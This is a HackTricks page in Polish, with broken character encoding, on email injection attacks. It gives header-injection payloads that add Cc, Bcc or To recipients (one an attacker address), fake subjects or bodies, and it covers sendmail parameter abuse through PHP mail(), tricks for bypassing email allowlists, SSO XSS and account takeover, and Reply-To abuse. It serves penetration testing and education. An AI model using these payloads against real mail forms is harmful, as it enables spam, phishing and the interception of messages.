# Email Injections

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## Wstrzykiwanie w wysÅ‚anym e-mailu

### Wstrzykiwanie Cc i Bcc po argumencie nadawcy
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
WiadomoÅ›Ä‡ zostanie wysÅ‚ana do kont odbiorcy i odbiorcy1.

### Wstrzyknij argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
WiadomoÅ›Ä‡ zostanie wysÅ‚ana do oryginalnego odbiorcy oraz konta atakujÄ…cego.

### Wstrzyknij argument Temat
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
FaÅ‚szywy temat zostanie dodany do oryginalnego tematu, a w niektÃ³rych przypadkach go zastÄ…pi. ZaleÅ¼y to od zachowania usÅ‚ugi pocztowej.

### ZmieÅ„ treÅ›Ä‡ wiadomoÅ›ci

Wstrzyknij dwa znaki nowej linii, a nastÄ™pnie napisz swojÄ… wiadomoÅ›Ä‡, aby zmieniÄ‡ treÅ›Ä‡ wiadomoÅ›ci.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Wykorzystanie funkcji mail() w PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5. parametr ($additional\_parameters)

Ta sekcja bÄ™dzie oparta na **tym, jak naduÅ¼yÄ‡ ten parametr, zakÅ‚adajÄ…c, Å¼e atakujÄ…cy go kontroluje**.

Ten parametr zostanie dodany do linii poleceÅ„, ktÃ³rÄ… PHP uÅ¼yje do wywoÅ‚ania binarnego sendmail. Zostanie jednak oczyszczony za pomocÄ… funkcji `escapeshellcmd($additional_parameters)`.

AtakujÄ…cy moÅ¼e **wstrzyknÄ…Ä‡ dodatkowe parametry dla sendmail** w tym przypadku.

#### RÃ³Å¼nice w implementacji /usr/sbin/sendmail

Interfejs **sendmail** jest **dostarczany przez oprogramowanie MTA do obsÅ‚ugi poczty** (Sendmail, Postfix, Exim itp.) zainstalowane na systemie. ChociaÅ¼ **podstawowa funkcjonalnoÅ›Ä‡** (taka jak parametry -t -i -f) pozostaje **taka sama** z powodÃ³w zgodnoÅ›ci, **inne funkcje i parametry** znacznie siÄ™ rÃ³Å¼niÄ… w zaleÅ¼noÅ›ci od zainstalowanego MTA.

Oto kilka przykÅ‚adÃ³w rÃ³Å¼nych stron podrÄ™cznika poleceÅ„ dla interfejsu sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

W zaleÅ¼noÅ›ci od **pochodzenia binarnego sendmail** odkryto rÃ³Å¼ne opcje, aby je naduÅ¼yÄ‡ i **ujawniaÄ‡ pliki lub nawet wykonywaÄ‡ dowolne polecenia**. SprawdÅº jak w [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Wstrzykiwanie w nazwie e-maila

### Ignorowane czÄ™Å›ci e-maila

Symbole: **+, -** i **{}** w rzadkich przypadkach mogÄ… byÄ‡ uÅ¼ywane do tagowania i sÄ… ignorowane przez wiÄ™kszoÅ›Ä‡ serwerÃ³w e-mailowych

* Np. john.doe+intigriti@example.com â†’ john.doe@example.com

**Komentarze w nawiasach ()** na poczÄ…tku lub na koÅ„cu rÃ³wnieÅ¼ bÄ™dÄ… ignorowane

* Np. john.doe(intigriti)@example.com â†’ john.doe@example.com

### OminiÄ™cie biaÅ‚ej listy

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Cytaty

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼ywaÄ‡ adresÃ³w IP jako nazw domenowych w nawiasach kwadratowych:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Inne luki

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## SSO stron trzecich

### XSS

NiektÃ³re usÅ‚ugi, takie jak **github** lub **salesforce**, pozwalajÄ… na stworzenie **adresu e-mail z Å‚adunkiem XSS**. JeÅ›li moÅ¼esz **uÅ¼yÄ‡ tych dostawcÃ³w do logowania siÄ™ do innych usÅ‚ug** i te usÅ‚ugi **nie oczyszczajÄ…** poprawnie e-maila, moÅ¼esz spowodowaÄ‡ **XSS**.

### PrzejÄ™cie konta

JeÅ›li **usÅ‚uga SSO** pozwala na **utworzenie konta bez weryfikacji podanego adresu e-mail** (jak **salesforce**) i nastÄ™pnie moÅ¼esz uÅ¼yÄ‡ tego konta do **logowania siÄ™ do innej usÅ‚ugi**, ktÃ³ra **ufa** salesforce, moÅ¼esz uzyskaÄ‡ dostÄ™p do dowolnego konta.\
_NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e salesforce wskazuje, czy podany e-mail byÅ‚ weryfikowany, ale aplikacja powinna uwzglÄ™dniÄ‡ te informacje._

## Odpowiedz-na

MoÅ¼esz wysÅ‚aÄ‡ e-mail uÅ¼ywajÄ…c _**From: company.com**_ i _**Replay-To: attacker.com**_, a jeÅ›li jakakolwiek **automatyczna odpowiedÅº** zostanie wysÅ‚ana, poniewaÅ¼ e-mail zostaÅ‚ wysÅ‚any **z** **wewnÄ™trznego adresu**, **atakujÄ…cy** moÅ¼e byÄ‡ w stanie **otrzymaÄ‡** tÄ™ **odpowiedÅº**.

## WskaÅºnik twardych odbiÄ‡

NiektÃ³re usÅ‚ugi, takie jak AWS, implementujÄ… prÃ³g znany jako **wskaÅºnik twardych odbiÄ‡**, zazwyczaj ustawiony na 10%. Jest to krytyczna metryka, szczegÃ³lnie dla usÅ‚ug dostarczania e-maili. Gdy ten wskaÅºnik zostanie przekroczony, usÅ‚uga, taka jak usÅ‚uga e-mailowa AWS, moÅ¼e zostaÄ‡ zawieszona lub zablokowana.

**Twarde odbicie** odnosi siÄ™ do **e-maila**, ktÃ³ry zostaÅ‚ zwrÃ³cony do nadawcy, poniewaÅ¼ adres odbiorcy jest nieprawidÅ‚owy lub nieistniejÄ…cy. MoÅ¼e to wystÄ…piÄ‡ z rÃ³Å¼nych powodÃ³w, takich jak **e-mail** wysÅ‚any na nieistniejÄ…cy adres, domenÄ™, ktÃ³ra nie jest rzeczywista, lub odmowa serwera odbiorcy przyjÄ™cia **e-maili**.

W kontekÅ›cie AWS, jeÅ›li wyÅ›lesz 1000 e-maili, a 100 z nich skutkuje twardymi odbiciami (z powodu takich powodÃ³w jak nieprawidÅ‚owe adresy lub domeny), oznacza to wskaÅºnik twardych odbiÄ‡ na poziomie 10%. OsiÄ…gniÄ™cie lub przekroczenie tego wskaÅºnika moÅ¼e spowodowaÄ‡ zablokowanie lub zawieszenie moÅ¼liwoÅ›ci wysyÅ‚ania e-maili przez AWS SES (Simple Email Service).

WaÅ¼ne jest, aby utrzymaÄ‡ niski wskaÅºnik twardych odbiÄ‡, aby zapewniÄ‡ nieprzerwanÄ… usÅ‚ugÄ™ e-mailowÄ… i utrzymaÄ‡ reputacjÄ™ nadawcy. Monitorowanie i zarzÄ…dzanie jakoÅ›ciÄ… adresÃ³w e-mail w twoich listach mailingowych moÅ¼e znacznie pomÃ³c w osiÄ…gniÄ™ciu tego celu.

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje, moÅ¼na odwoÅ‚aÄ‡ siÄ™ do oficjalnej dokumentacji AWS dotyczÄ…cej obsÅ‚ugi odbiÄ‡ i skarg [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## OdnoÅ›niki

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
